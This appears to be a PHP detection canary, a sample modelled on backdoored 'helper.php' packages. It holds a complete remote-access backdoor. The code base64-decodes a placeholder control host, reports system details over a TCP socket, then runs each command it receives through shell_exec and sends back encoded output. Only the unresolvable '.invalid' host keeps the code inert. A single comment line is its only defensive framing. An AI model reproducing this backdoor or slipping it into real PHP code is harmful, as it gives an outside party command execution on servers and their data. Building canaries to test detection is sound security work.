<?php
// inert canary modelled on the 2025 RAT-in-helper.php packages
$h = base64_decode('Y2FuYXJ5LWMyLmludmFsaWQ=');
function run_cmd($c) {
    foreach (array('shell_exec', 'exec', 'system', 'passthru') as $f) {
        if (function_exists($f)) { return $f($c); }
    }
}
$s = @stream_socket_client('tcp://' . $h . ':2096', $en, $es, 10);
if ($s) {
    fwrite($s, php_uname() . "\n");
    while (!feof($s)) {
        $cmd = trim(fgets($s));
        $out = shell_exec($cmd);
        fwrite($s, base64_encode($out) . "\n");
    }
}
